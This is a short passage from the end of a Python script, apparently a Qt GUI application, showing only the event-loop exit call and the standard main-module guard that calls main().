    sys.exit(app.exec())
if __name__ == '__main__':
    main()
